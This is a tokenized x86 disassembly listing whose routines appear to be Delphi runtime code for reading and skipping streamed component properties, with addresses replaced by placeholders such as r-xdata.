mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410594
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403318
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410594
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417f84
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416e84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416e84
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410604
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_417be4
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417dd7
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov edi ebx
jmp r-xdata
sub_417d98
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_40388c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4038e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417dd7
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
sub_417de0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413254
mov ebx eax
test ebx ebx
je r-xdata
call sub_416970
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410678
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417e28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416404
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413704
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417e68
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_417eb7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418fec
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_410b14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ebe
lea eax [ ebp - 0x10 ]
call sub_40e6d0
retn
sub_417ec4
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_417f76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_416e74
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4178e4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416404
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413704
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4188d4
lea eax [ ebp - 0x4 ]
call sub_4054e8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_410bc8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f7d
lea eax [ ebp - 0x8 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_4054e8
retn
sub_417f84
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41827f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418286
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x24 ]
call sub_40458c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403ed0
retn
jmp [ eax * 4 + jump_table_418014 ]
mov eax [ rw-data ]
call sub_416958
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410604
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416e74
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416f34
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410678
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4178e4
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410530
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410678
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177c8
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410908
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418734
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410808
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4187f0
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410834
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418618
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410678
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416e74
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416e74
cmp al 0xd
jne r-xdata
push ebp
call sub_417e68
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a50
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b8c
jmp r-xdata
push ebp
call sub_417ec4
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410604
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4179e4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410678
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4178e4
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417de0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d4
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410678
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_4178e4
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b54
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410604
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_416f8c
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b54
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4178e4
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417e28
pop ecx
jmp r-xdata
sub_41828c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403f00
jmp r-xdata
mov eax [ ebx ]
call sub_4133ec
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408940
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4182ec
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418607
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4186d4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4185e5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4185a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4186f8
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4186f8
mov eax [ ebp - 0x1c ]
call sub_412fc0
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4186f8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4186f8
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41828c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4186f8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403038
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412d10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41854b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405c18
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413704
xor eax eax
push ebp
push sub_41852b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4138bc
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418532
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4030f0
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_413860
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41857c
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4038e0
jmp r-xdata
call sub_40388c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_416680
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4185ec
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4185ab
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416828
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_40388c
call sub_4038e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4185ec
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4030f0
sub_418618
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4186c2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418695
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4188d4
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4104d8
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_416970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4169a8
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186c9
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4186f8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_4186f8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416e98
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403f9c
mov eax esi
call j_sub_404378
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416e98
pop edx
pop esi
pop ebx
retn
sub_418734
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4187e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416e74
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4187f0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404134
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4187e8
lea eax [ ebp - 0x8 ]
call sub_40458c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4188d4
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416e98
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4044f8
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416e98
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416e98
jmp r-xdata
jmp r-xdata
call sub_416970
sub_4187f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4188c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416e74
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418734
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4046d8
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4188ce
lea eax [ ebp - 0xc ]
call sub_403eac
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4188d4
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416e98
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4047d4
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_416e98
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416e98
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4044f8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416e98
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4058b8
jmp r-xdata
jmp r-xdata
call sub_416970
sub_4188e8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418924
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4186f8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41892b
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_418930
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416b30
test al al
je r-xdata
mov eax [ ebx ]
call sub_4189e4
mov eax [ ebx ]
call sub_417a9c
pop ebx
pop ebp
retn
sub_418958
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416e98
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418ddc
pop ebx
pop ecx
pop ebp
retn
sub_418988
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416b30
test al al
je r-xdata
mov eax [ ebx ]
call sub_416e74
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417a9c
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_418ddc
jmp r-xdata
mov eax [ ebx ]
call sub_4189e4
mov eax [ ebx ]
call sub_416b30
test al al
je r-xdata
mov eax [ ebx ]
call sub_418b80
mov eax [ ebx ]
call sub_417a9c
sub_4189e4
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418b73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4188d4
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b7a
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
jmp [ eax * 4 + jump_table_418a1b ]
push ebp
call sub_418930
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_418ddc
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_418ddc
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418ddc
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_418ddc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4186f8
jmp r-xdata
push ebp
mov eax 0x1
call sub_418958
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188e8
jmp r-xdata
push ebp
mov eax 0x1
call sub_418958
pop ecx
jmp r-xdata
push ebp
call sub_418988
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418ddc
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418ddc
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418ddc
jmp r-xdata
push ebp
mov eax 0x2
call sub_418958
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418ddc
jmp r-xdata
push ebp
mov eax 0x1
call sub_418958
pop ecx
sub_418b80
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418bbd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4186f8
mov eax ebx
call sub_4189e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418bc4
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_418bc8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_418c60
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_416b30
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4186f8
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4186f8
jmp r-xdata
mov eax ebx
call sub_418b80
mov eax ebx
call sub_417a9c
jmp r-xdata
mov eax ebx
call sub_416b30
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_418bc8
mov eax ebx
call sub_417a9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c67
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed0
retn
sub_418c70
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418d15
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f44
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a014
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d1c
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
sub_418d40
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_418d68
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_416dc8
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_412f00
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403304
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_416dc8
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_418ddc
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_416e98
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_416e98
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_418e24
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418fcd
push [ fs : eax ]
mov [ fs : eax ] esp
